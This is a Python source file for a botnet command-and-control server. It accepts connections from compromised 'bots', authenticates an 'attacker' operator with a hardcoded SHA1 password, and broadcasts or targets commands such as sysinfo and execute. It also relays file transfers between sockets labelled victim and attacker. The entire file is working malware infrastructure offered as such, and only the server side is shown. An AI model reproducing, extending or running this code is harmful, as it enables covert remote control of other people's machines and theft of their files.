#!/usr/bin/python3

import socket  # import socket library
import sys  # import system library for parsing arguments
import os  # import os library to call exit and kill threads
import threading  # import threading library to handle multiple connections
import queue  # import queue library to handle threaded data
import time
import hashlib
import datetime
from pathlib import Path

q = queue.Queue()
Socketthread = []
bot_list = {}
last_seen_bots = {}
cmd_list = ['bots', 'whoami', 'pwd', 'sysinfo', 'ls', 'cd', 'cp', 'send', 'mkdir', 'execute']
bot_id_list = []
counter_bot_id = 1


def main():
    try:
        lhost = '127.0.0.1'  # sys.argv[1]
        lport = 8080  # sys.argv[2]

        # attackerthread = Attacker(lhost, 8081, q)
        # attackerthread.start()

        listener(lhost, int(lport), q)
        # listen('0.0.0.0', 8081)
    except Exception as ex:
        print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")


def getHash(keyword='root'):
    hash_object = hashlib.sha1(keyword.encode('utf-8'))
    hex_dig = hash_object.hexdigest()
    return hex_dig


class Attacker(threading.Thread):
    def __init__(self, lhost, lport, qv):
        threading.Thread.__init__(self)
        self.lhost = lhost
        self.lport = lport
        self.q = qv
        self.server = listen(self.lhost, self.lport)
        self.client = ""

        # def send_cmd_response(self, response):

    def get_client(self):
        return self.client

    def cmd_exist(self, cmd):
        if cmd in cmd_list:
            return True
        for val in cmd_list:
            if val in cmd:
                return True
        return False

    def reply_cmd(self, cmd, bot_id):

        if self.cmd_exist(cmd):
            if cmd == 'bots':
                self.client.send('1'.encode('utf-8'))
                respond = "[+] List of online Bots\n========\nBot ID\t\t IP Address\t\t Port\n"
                for i in bot_list.keys():
                    client_info = str(bot_list[i])
                    ip_addr = client_info[2:client_info.find(',') - 1]
                    port = client_info[client_info.find(',') + 1: -1]
                    respond += str(i[i.find('-') + 1:]) + "\t\t " + ip_addr + "\t\t" + port + "\n"
                self.client.send(respond.encode('utf-8'))

            else:

                if bot_id != '0':  # if any id of bot is received then add the id to cmd and put it to q
                    if cmd[:2] == 'cp' or cmd[:4] == 'send':
                        self.client.send('transfer'.encode('utf-8'))
                    else:
                        self.client.send('1'.encode('utf-8'))
                    cmd = cmd + '|' + bot_id


                else:  # else means command is for every bot
                    self.client.send(str(len(bot_list)).encode('utf-8'))

                for i in range(len(Socketthread)):
                    time.sleep(0.3)
                    self.q.put(cmd)
        else:
            self.client.send('1'.encode('utf-8'))
            self.client.send(str('[-] Command not found').encode('utf-8'))

    def last_seen_message(self):
        respond = "[-] No bot is currently online...\n"
        if len(last_seen_bots) != 0:
            respond += "Last seen bots\n=======\n"
            respond += "ID\t\tLast seen\t\tIP\t\tPort\n"
            for i in last_seen_bots.keys():
                respond += str(i[i.find('-') + 1:]) + "\t\t" + str(last_seen_bots[i][0]) + "\t\t" + \
                           str(last_seen_bots[i][1]) + "\t\t" + str(last_seen_bots[i][2]) + "\n"
        return respond

    def get_cmd(self):
        try:
            self.client.send('[*] Waiting for commands...'.encode('utf-8'))

            while True:
                bot_id = self.client.recv(1024).decode('utf-8')

                cmd = self.client.recv(1024).decode('utf-8')
                if len(bot_list) != 0:
                    self.reply_cmd(cmd, bot_id)

                else:
                    self.client.send('1'.encode('utf-8'))
                    self.client.send(self.last_seen_message().encode('utf-8'))
                    # self.client.send("[-] No bot is currently online...".encode('utf-8'))
        except:
            return False

    def authenticate(self):
        password = getHash()
        i = 3

        while True:
            keyword = self.client.recv(1024).decode('utf-8')
            if i == 0:
                return False

            i -= 1
            if password == getHash(keyword):
                self.client.send("Successfully authenticated..".encode('utf-8'))
                return True

            else:
                message = '[-] Try Again... ' + str(i) + ' moves are left.'
                self.client.send(message.encode('utf-8'))

        return true

    def run(self):
        while True:
            while True:
                (self.client, client_address) = self.server.accept()

                self.client.send("Please enter keyword...".encode('utf-8'))
                try:
                    if not self.authenticate():
                        self.client.send("Out of moves...".encode('utf-8'))
                        self.server.close()
                    else:
                        break
                except:
                    bot_list.clear()
                    break

            self.get_cmd()


def listen(lhost, lport) -> socket.socket:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # if lport == 8080:
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen()
    return server


def listener(lhost, lport, q):
    server = listen(lhost, lport)

    print("[+] Starting listener on tcp://" + lhost + ":" + str(lport) + "\n")
    print('[+] Starting listener on tcp://' + lhost + ':' + str(8081) + '\n')
    # BotCmdThread = BotCmd(q)
    # BotCmdThread.start()

    attacker_thread = Attacker(lhost, 8081, q)
    attacker_thread.start()

    while True:
        (client, client_address) = server.accept()
        newthread = BotHandler(client, client_address, q, attacker_thread)
        Socketthread.append(newthread)
        newthread.start()


class BotCmd(threading.Thread):  # Inheriting from threding.Thread
    def __init__(self, qv2):
        threading.Thread.__init__(self)  # Overriding constructor of Thread class
        self.q = qv2

    def run(self):
        while True:
            sendCmd = str(input("BotCmd> "))
            if sendCmd == "":
                pass
            elif sendCmd == "exit":
                for i in range(len(Socketthread)):
                    time.sleep(0.1)
                    self.q.put(sendCmd)
                time.sleep(5)
                os._exit(0)
            else:
                print("[+] Sending Command: " + sendCmd + " to " + str(len(Socketthread)) + " bots")
                for i in range(len(Socketthread)):
                    time.sleep(0.1)
                    self.q.put(sendCmd)


clean_cmd = lambda cmd: cmd if '|' not in cmd else cmd[0: cmd.find('|')]


class BotHandler(threading.Thread):
    def __init__(self, client, client_address, qv, attacker_thread):
        threading.Thread.__init__(self)
        self.bot_client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.q = qv
        self.attacker_thread = attacker_thread
        self.alive = True

    # clean_second = lambda self, val, zero: val.replace('-', '0') if val.find('-') == 0 \
    #    else (zero + val) if len(val) == 1 else val

    def clean_second(self, val):
        if val.find('-') != -1:
            return val.replace('-', '0')
        elif len(val) == 1:
            val = '0' + val
            return val
        else:
            return val

    def conn_alive(self, bot_name):

        while True:
            try:
                time.sleep(6)
                self.bot_client.send('Check'.encode('utf-8'))
            except:
                self.alive = False
                bot_list.pop(bot_name)

                if len(last_seen_bots) > 3:
                    last_seen_bots.pop(list(last_seen_bots.keys())[0])

                time_now = str(datetime.datetime.now().time())
                last_seen_bots[bot_name] = [time_now[0: time_now.find('.') - 2] + self.clean_second(
                    str(int(time_now[time_now.find('.') - 2: time_now.find('.')]) - 6)
                )]
                last_seen_bots[bot_name].append(self.ip)
                last_seen_bots[bot_name].append(self.port)

                return False

    def accept_transfer_server(self, server_tr):
        (client_s, client_address_s) = server_tr.accept()
        print(str(client_address_s[0]) + " " + str(client_address_s[1]) + " connected")
        return client_s, client_address_s

    def build_transfer_tcp(self):
        server_tr_v = listen('127.0.0.1', 8000)  # victim
        server_tr_a = listen('127.0.0.1', 8001)  # attacker

        (client_v, client_v_addr) = self.accept_transfer_server(server_tr_v)  # victim
        (client_a, client_addr_a) = self.accept_transfer_server(server_tr_a)  # attacker

        return client_a, client_v

    def transfer_file(self, command):
        try:
            client_v, client_a = self.build_transfer_tcp()

            # first need to get the confirmation that file exists

            exist = client_v.recv(1024).decode('utf-8')
            client_a.send(exist.encode('utf-8'))
            client_s = client_a
            client_r = client_v
            if exist == "T":

                if 'send' in command:
                    client_r = client_a
                    client_s = client_v

                data = client_r.recv(1024)
                while data:
                    print('Receiving...')
                    client_s.send(data)

                    data = client_r.recv(1024)
            else:
                client_s.shutdown(socket.SHUT_WR)
                client_s.close()

        except Exception as ex:
            print(ex)
            print('Done.../')

            client_a.shutdown(socket.SHUT_WR)
            client_a.close()
        # client_a.shutdown(socket.SHUT_WR)
        # client_a.close()

    def run(self):
        bot_name = threading.Thread.getName(self)
        print("\n[*] Bot " + self.ip + ":" + str(self.port) + " connected with Thread-ID: ", bot_name)
        bot_list[bot_name] = self.client_address

        thread_tracker = threading.Thread(target=self.conn_alive, args=(bot_name,))
        thread_tracker.start()

        while self.alive:

            recv_bot_cmd = self.q.get()

            if '|' not in recv_bot_cmd or bot_name[bot_name.find('-') + 1:] == recv_bot_cmd[
                                                                               recv_bot_cmd.find('|') + 1:]:

                recv_bot_cmd = clean_cmd(recv_bot_cmd)

                print('\n' + recv_bot_cmd + '.....')

                try:
                    self.bot_client.send(recv_bot_cmd.encode('utf-8'))  # send the command to bot
                    att_client = self.attacker_thread.get_client()
                    if 'cp' in recv_bot_cmd or 'send' in recv_bot_cmd:
                        print('Got cmd..../')
                        self.transfer_file(recv_bot_cmd)
                    else:
                        recv_val = (self.bot_client.recv(5000)).decode('utf-8')
                        print(recv_val)
                        recv_val = '[+] (Bot ID: ' + str(bot_name[bot_name.find('-') + 1:]) + ') ' + recv_val

                        att_client.send(recv_val.encode('utf-8'))

                except Exception as ex:
                    """ print('done')
                    att_client.shutdown(socket.SHUT_WR)
                    att_client.close() """
                    break


if __name__ == '__main__':
    main()
    # last modification - sending command to one bot functionality is added
    # logical error -> attacker sends command and suddenly it disconnects, command stay in the server queue
